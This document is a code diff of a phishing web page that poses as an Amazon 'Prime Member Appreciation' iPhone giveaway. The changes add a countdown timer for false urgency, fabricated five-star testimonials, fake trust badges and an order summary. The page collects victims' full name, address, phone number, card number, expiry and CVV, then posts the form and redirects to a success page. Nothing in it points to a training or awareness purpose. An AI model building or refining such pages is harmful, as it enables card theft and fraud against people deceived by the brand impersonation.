@@ -16,11 +16,14 @@
             <div class="logo-container">
                 <img src="amazon-logo.png" alt="Amazon Logo" class="logo">
             </div>
-            <!-- Removed all links; just static text for nav items -->
+            <div class="search-bar">
+                <input type="text" placeholder="Search Amazon" disabled>
+                <button disabled>🔍</button>
+            </div>
             <ul>
                 <li><span>Hello, Sign in</span></li>
                 <li><span>Returns & Orders</span></li>
-                <li><span>Cart</span></li>
+                <li><span>🛒 Cart</span></li>
             </ul>
         </nav>
         <div class="progress-bar">
@@ -29,22 +32,33 @@
         <h1>Congratulations! You've Won an iPhone 15 Pro Max</h1>
     </header>
     
-    <main>
+    <main class="container">
         <section class="prize-section">
             <img src="prize-image.jpg" alt="iPhone 15 Pro Max" class="prize-img">
             <p>Dear Valued Amazon Customer,</p>
             <p>As a thank you for your loyalty, you've been randomly selected to win a brand new iPhone 15 Pro Max (valued at $1,199)! This is part of our exclusive Prime Member Appreciation Giveaway.</p>
             <p>To claim your prize, simply cover the minimal shipping and handling fee of <strong>$0.99</strong>. We'll ship it to your address within 3-5 business days via Amazon Logistics.</p>
-            <p>Hurry! This offer expires in 24 hours.</p>
+            <div class="urgency">Hurry! Offer expires in <span id="countdown">24:00:00</span>.</div>
             <div class="trust-badges">
                 <span>✅ Verified Amazon Giveaway</span>
                 <span>🔒 Secure SSL Encryption</span>
             </div>
             <div class="testimonials">
-                <p>"I claimed my prize and it arrived in 3 days! Thanks Amazon!" - Sarah K.</p>
-                <p>"Unbelievable! A free iPhone just for being a Prime member. Shipped super fast." - Mike T.</p>
-                <p>"This giveaway is legit – my new phone is amazing. Don't miss out!" - Emily R.</p>
-                <p>"Won and received it without any issues. Amazon always delivers!" - David S.</p>
+                <div class="testimonial">
+                    <p>★★★★★ "I claimed my prize and it arrived in 3 days! Thanks Amazon!" - Sarah K.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Unbelievable! A free iPhone just for being a Prime member. Shipped super fast." - Mike T.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "This giveaway is legit – my new phone is amazing. Don't miss out!" - Emily R.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Won and received it without any issues. Amazon always delivers!" - David S.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Best surprise ever! The $0.99 fee was worth it for this prize." - Lisa M.</p>
+                </div>
             </div>
         </section>
         
@@ -56,84 +70,122 @@
                 <p hidden><label>Don’t fill this out: <input name="bot-field"></label></p>
                 
                 <!-- Address Details -->
-                <h3>Shipping Address</h3>
-                <div class="form-grid">
-                    <div>
-                        <label for="full_name">Full Name</label>
-                        <input type="text" id="full_name" name="full_name" placeholder="John Doe" required>
+                <fieldset>
+                    <legend>Shipping Address</legend>
+                    <div class="form-grid">
+                        <div>
+                            <label for="full_name">Full Name</label>
+                            <input type="text" id="full_name" name="full_name" placeholder="John Doe" required>
+                        </div>
+                        <div>
+                            <label for="phone">Phone Number</label>
+                            <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" required>
+                        </div>
+                        <div class="full-width">
+                            <label for="address_line1">Address Line 1</label>
+                            <input type="text" id="address_line1" name="address_line1" placeholder="123 Main St" required>
+                        </div>
+                        <div class="full-width">
+                            <label for="address_line2">Address Line 2 (Optional)</label>
+                            <input type="text" id="address_line2" name="address_line2" placeholder="Apt 4B">
+                        </div>
+                        <div>
+                            <label for="city">City</label>
+                            <input type="text" id="city" name="city" placeholder="Anytown" required>
+                        </div>
+                        <div>
+                            <label for="state">State/Province</label>
+                            <input type="text" id="state" name="state" placeholder="CA" required>
+                        </div>
+                        <div>
+                            <label for="zip">ZIP/Postal Code</label>
+                            <input type="text" id="zip" name="zip" placeholder="12345" required>
+                        </div>
+                        <div>
+                            <label for="country">Country</label>
+                            <input type="text" id="country" name="country" value="United States" readonly required>
+                        </div>
                     </div>
-                    <div>
-                        <label for="phone">Phone Number</label>
-                        <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" required>
-                    </div>
-                    <div class="full-width">
-                        <label for="address_line1">Address Line 1</label>
-                        <input type="text" id="address_line1" name="address_line1" placeholder="123 Main St" required>
-                    </div>
-                    <div class="full-width">
-                        <label for="address_line2">Address Line 2 (Optional)</label>
-                        <input type="text" id="address_line2" name="address_line2" placeholder="Apt 4B">
-                    </div>
-                    <div>
-                        <label for="city">City</label>
-                        <input type="text" id="city" name="city" placeholder="Anytown" required>
-                    </div>
-                    <div>
-                        <label for="state">State/Province</label>
-                        <input type="text" id="state" name="state" placeholder="CA" required>
-                    </div>
-                    <div>
-                        <label for="zip">ZIP/Postal Code</label>
-                        <input type="text" id="zip" name="zip" placeholder="12345" required>
-                    </div>
-                    <div>
-                        <label for="country">Country</label>
-                        <input type="text" id="country" name="country" value="United States" readonly required>
-                    </div>
-                </div>
+                </fieldset>
                 
                 <!-- Card Details -->
-                <h3>Payment Information</h3>
-                <p class="card-icons">Accepted: Visa | Mastercard | Amex | Discover</p>
-                <div class="form-grid">
-                    <div class="full-width">
-                        <label for="card_name">Name on Card</label>
-                        <input type="text" id="card_name" name="card_name" placeholder="John Doe" required>
+                <fieldset>
+                    <legend>Payment Information</legend>
+                    <p class="card-icons">Accepted: Visa | Mastercard | Amex | Discover</p>
+                    <div class="form-grid">
+                        <div class="full-width">
+                            <label for="card_name">Name on Card</label>
+                            <input type="text" id="card_name" name="card_name" placeholder="John Doe" required>
+                        </div>
+                        <div class="full-width">
+                            <label for="card_number">Card Number</label>
+                            <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" pattern="\d{13,19}" required>
+                        </div>
+                        <div>
+                            <label for="exp_month">Exp. Month (MM)</label>
+                            <input type="text" id="exp_month" name="exp_month" placeholder="MM" pattern="\d{2}" required>
+                        </div>
+                        <div>
+                            <label for="exp_year">Exp. Year (YY)</label>
+                            <input type="text" id="exp_year" name="exp_year" placeholder="YY" pattern="\d{2}" required>
+                        </div>
+                        <div>
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" pattern="\d{3,4}" required>
+                        </div>
                     </div>
-                    <div class="full-width">
-                        <label for="card_number">Card Number</label>
-                        <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" pattern="\d{13,19}" required>
-                    </div>
-                    <div>
-                        <label for="exp_month">Exp. Month (MM)</label>
-                        <input type="text" id="exp_month" name="exp_month" placeholder="MM" pattern="\d{2}" required>
-                    </div>
-                    <div>
-                        <label for="exp_year">Exp. Year (YY)</label>
-                        <input type="text" id="exp_year" name="exp_year" placeholder="YY" pattern="\d{2}" required>
-                    </div>
-                    <div>
-                        <label for="cvv">CVV</label>
-                        <input type="text" id="cvv" name="cvv" placeholder="123" pattern="\d{3,4}" required>
-                    </div>
-                </div>
+                </fieldset>
                 
                 <div class="terms">
                     <input type="checkbox" id="terms" required>
-                    <label for="terms">I agree to the terms and conditions</label> <!-- Removed link -->
+                    <label for="terms">I agree to the terms and conditions</label>
                 </div>
                 
                 <button type="submit" class="submit-btn">Claim Prize & Pay $0.99</button>
             </form>
         </section>
+        
+        <aside class="sidebar">
+            <h3>Order Summary</h3>
+            <div class="summary-item">
+                <span>iPhone 15 Pro Max</span>
+                <span>FREE</span>
+            </div>
+            <div class="summary-item">
+                <span>Shipping & Handling</span>
+                <span>$0.99</span>
+            </div>
+            <div class="summary-item">
+                <span>Shipping</span>
+                <span>FREE (Prime)</span>
+            </div>
+            <hr>
+            <div class="summary-total">
+                <span>Total</span>
+                <span>$0.99</span>
+            </div>
+            <p class="summary-note">Your card will be charged upon submission.</p>
+        </aside>
     </main>
     
     <footer>
         <p>&copy; 2025 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
-        <p>Privacy Notice | Conditions of Use | Interest-Based Ads</p> <!-- Removed links -->
+        <p>Privacy Notice | Conditions of Use | Interest-Based Ads</p>
     </footer>
     
     <script>
+        // Countdown timer
+        let time = 24 * 60 * 60; // 24 hours
+        const countdownElement = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            time--;
+            const hours = Math.floor(time / 3600).toString().padStart(2, '0');
+            const minutes = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
+            const seconds = (time % 60).toString().padStart(2, '0');
+            countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
+            if (time <= 0) clearInterval(interval);
+        }, 1000);
+
         // Card number formatting
         document.getElementById('card_number').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
@@ -149,8 +201,12 @@
                 method: 'POST',
                 body: formData
             })
-            .then(() => {
-                window.location.href = 'success.html';
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'success.html';
+                } else {
+                    console.error('Submission failed');
+                }
             })
             .catch(error => console.error('Error:', error));
         });
